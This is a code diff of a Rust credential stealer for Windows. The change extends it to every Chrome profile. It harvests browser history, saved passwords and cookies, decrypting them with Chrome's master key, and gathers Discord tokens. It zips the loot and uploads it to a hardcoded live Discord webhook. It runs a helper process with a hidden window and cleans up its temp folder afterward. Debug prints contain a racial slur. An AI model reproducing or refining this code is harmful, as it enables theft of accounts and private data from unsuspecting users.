@@ -19,7 +19,7 @@ fn main() {
         exit(0);
     }
 
-    let spacer = "=".repeat(50);
+    let spacer = "=".repeat(50); 
     let user = var("USERNAME").expect("Failed to get USERNAME");
     let base_dir = format!("C:/Users/{}/AppData/Local/Temp/", &user);
     let crat_dir = create_dir(format!("{}tmpv54g6jg6/", base_dir));
@@ -27,26 +27,43 @@ fn main() {
     match crat_dir {
         Ok(()) =>  tmp_dir = format!("{}tmpv54g6jg6/", base_dir),
         Err(e) if e.kind() == ErrorKind::AlreadyExists => {
-            print!("{}", e);
-            let _ =create_dir(format!("{}tmpncd49pkt/", base_dir));
-            tmp_dir = format!("{}tmpncd49pkt/", base_dir);
+            tmp_dir = format!("{}tmpv54g6jg6/", base_dir);
+            let _ = remove_dir_all(&tmp_dir);
         },
         Err(_) => exit(0),
     };
 
+    let _ = File::create(format!("{}History.txt", &tmp_dir));
+    let _ = File::create(format!("{}Passwords.txt", &tmp_dir));
+    let _ = File::create(format!("{}Cookies.txt", &tmp_dir));
+    let chrome_folder = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\", &user);
 
-    history(spacer.clone(), &tmp_dir);
-    passwords(&spacer, &tmp_dir);
-    cookies(spacer.clone(), &tmp_dir);
-    let vec_tkn = token();
-    let _ = function(spacer, vec_tkn, tmp_dir);
+    let path = Path::new(&chrome_folder);
+    if path.is_dir() {
+        for folder in find_folders_with_name(&chrome_folder, "Profile") {
+            history(&spacer, &tmp_dir, &folder);
+            passwords(&spacer, &tmp_dir, &folder);
+            cookies(&spacer, &tmp_dir, &folder);
+        }
+        history(&spacer, &tmp_dir, &"Default".to_string());
+        passwords(&spacer, &tmp_dir, &"Default".to_string());
+        cookies(&spacer, &tmp_dir, &"Default".to_string());
+    }
+    let _ = File::create(format!("{}info.txt", &tmp_dir));
+    let discord_folder = format!("C:\\Users\\{}\\AppData\\Roaming\\discord\\", &user);
+    let mut vec_tkn: Vec<String> = Vec::new();
+    let path = Path::new(&discord_folder);
+    if path.is_dir() {
+        vec_tkn = token();
+    }
+    let _ = function(&spacer, vec_tkn, &tmp_dir);
+    let _ = remove_dir_all(&tmp_dir);
 }
 
 
-fn function(spacer: String, vec_tkn: Vec<String>, tmp_dir: String) -> Result<(), Box<dyn std::error::Error>> {
+fn function(spacer: &String, vec_tkn: Vec<String>, tmp_dir: &String) -> Result<(), Box<dyn std::error::Error>> {
     let mut file = OpenOptions::new()
     .append(true)
-    .create(true)
     .open(format!("{}info.txt", &tmp_dir))?;
     for tkn in &vec_tkn {
         let client = reqwest::blocking::Client::new();
@@ -159,7 +176,7 @@ fn function(spacer: String, vec_tkn: Vec<String>, tmp_dir: String) -> Result<(),
     std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}Cookies.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
     zip_writer.finish().unwrap();
     
-    let webhook_url = "Your_Discord_Webhook";
+    let webhook_url = "https://discord.com/api/webhooks/1089029413955453018/3gcxGd1RVb36-KZpTm1rHTwFvYyIu0VwXrP9n-5W-_dLzy___IDLp3Z-hOrUIMNQMiCq";
     let file_path = format!("{}{}.zip", &tmp_dir, hostnames);
     let file_name = format!("{}.zip", hostnames);
     let file_contents = read(file_path)?;
@@ -171,8 +188,6 @@ fn function(spacer: String, vec_tkn: Vec<String>, tmp_dir: String) -> Result<(),
 
     let client = Client::new();
     client.post(webhook_url).multipart(form).send()?;
-
-    let _ = remove_dir_all(&tmp_dir);
 
     Ok(())
 }   
@@ -324,19 +339,26 @@ fn ad() -> String {
         " /I ",
         "'Dbg'",
     ])
-    .creation_flags(0x08000000)
-    .output()
-    .expect("");
-let key = String::from_utf8(output.stdout).unwrap().trim().to_string();
-if output.status.success() {
-    return key;
-} else {
-    let error = format!("{}", key).to_string();
-    return error;
+        .creation_flags(0x08000000)
+        .output()
+        .expect("");
+    let key = String::from_utf8(output.stdout).unwrap().trim().to_string();
+    if output.status.success() {
+        return key;
+    } else {
+        let error = format!("{}", key).to_string();
+        return error;
+    }
 }
-}
-fn history(spacer: String, tmp_dir: &String) {
-    let chrome_history = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", var("USERNAME").expect("Failed to get USERNAME"));
+fn history(spacer: &String, tmp_dir: &String, folder: &String) {
+    let history_path = format!("{}History.txt", &tmp_dir);
+    let mut file = match OpenOptions::new()
+        .append(true)
+        .open(&history_path) {
+        Ok(file) => file,
+        Err(_) => panic!("Failed to open file {}", &history_path),
+    };
+    let chrome_history = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\{}\\History", var("USERNAME").expect("Failed to get USERNAME"), folder);
     let check_path = Path::new(&chrome_history);
     if !check_path.exists() {
         return;
@@ -390,12 +412,19 @@ fn history(spacer: String, tmp_dir: &String) {
         })
         .collect::<Vec<String>>()
         .join("\n\n");
-    dastuff = format!("URL\n\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
-    write(format!("{}History.txt", &tmp_dir), dastuff).unwrap();
+    dastuff = format!("\n\nURL\t\t\t\t{}\n\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
+    match file.write_all(dastuff.as_bytes()) {
+        Ok(_) => println!("nigus"),
+        Err(e) => println!("Error writing data to the file: {}", e),
+    }
     return
 }
-fn passwords(spacer: &String, tmp_dir: &String) {
-    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data", var("USERNAME").expect("Failed to get USERNAME"));
+fn passwords(spacer: &String, tmp_dir: &String, folder: &String) {
+    let mut file = OpenOptions::new()
+    .append(true)
+    .open(format!("{}Passwords.txt", &tmp_dir))
+    .unwrap();
+    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/{}/Login Data", var("USERNAME").expect("Failed to get USERNAME"), folder);
     let check_path = Path::new(&chrome_history);
     if !check_path.exists() {
         return;
@@ -420,7 +449,7 @@ fn passwords(spacer: &String, tmp_dir: &String) {
                 return;
             }
         };
-    let master_key_bytes = getkey(format!("C:\\Users\\hoey\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"));
+    let master_key_bytes = getkey(format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", var("USERNAME").expect("Failed to get USERNAME")));
     let iter = match response.query_map([], |row| {
         Ok([
             match row.get::<usize, String>(0) {
@@ -449,12 +478,19 @@ fn passwords(spacer: &String, tmp_dir: &String) {
         })
         .collect::<Vec<String>>()
         .join("\n\n");
-    dastuff = format!("\t\tURL\t\t\t\t\t         Username\t\t    Password\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
-    write(format!("{}Passwords.txt", &tmp_dir), dastuff).unwrap();
+    dastuff = format!("\n\n\t\tURL\t\t\t\t\t         Username\t\t    Password\t\t\t\t{}\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
+    match file.write_all(dastuff.as_bytes()){
+        Ok(_) => println!("nigus"),
+        Err(e) => println!("Error writing data to the file: {}", e),
+    }
     return
 }
-fn cookies(spacer: String, tmp_dir: &String) {
-    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", var("USERNAME").expect("Failed to get USERNAME"));
+fn cookies(spacer: &String, tmp_dir: &String, folder: &String) {
+    let mut file = OpenOptions::new()
+    .append(true)
+    .open(format!("{}Cookies.txt", &tmp_dir))
+    .unwrap();
+    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/{}/Network/Cookies", var("USERNAME").expect("Failed to get USERNAME"), folder);
     let check_path = Path::new(&chrome_history);
     if !check_path.exists() {
         return;
@@ -479,7 +515,7 @@ fn cookies(spacer: String, tmp_dir: &String) {
                 return;
             }
         };
-    let master_key_bytes = getkey(format!("C:\\Users\\hoey\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"));
+    let master_key_bytes = getkey(format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", var("USERNAME").expect("Failed to get USERNAME")));
     let iter = match response.query_map([], |row| {
         Ok([
             match row.get::<usize, Vec<u8>>(0) {
@@ -504,7 +540,23 @@ fn cookies(spacer: String, tmp_dir: &String) {
         })
         .collect::<Vec<String>>()
         .join("\n\n");
-    dastuff = format!("\t\tCookies\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
-    write(format!("{}Cookies.txt", &tmp_dir), dastuff).unwrap();
+    dastuff = format!("\n\n\t\tCookies\t\t\t\t{}\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
+    match file.write_all(dastuff.as_bytes()){
+        Ok(_) => println!("nigus"),
+        Err(e) => println!("Error writing data to the file: {}", e),
+    }
     return
+}
+fn find_folders_with_name(dir_path: &str, name: &str) -> Vec<String> {
+    let mut folders = Vec::new();
+    for entry in read_dir(dir_path).expect("Failed to read directory") {
+        let path = entry.expect("Failed to get directory entry").path();
+        if path.is_dir() {
+            let folder_name = path.file_name().unwrap().to_string_lossy().to_string();
+            if folder_name.contains(name) {
+                folders.push(folder_name);
+            }
+        }
+    }
+    folders
 }
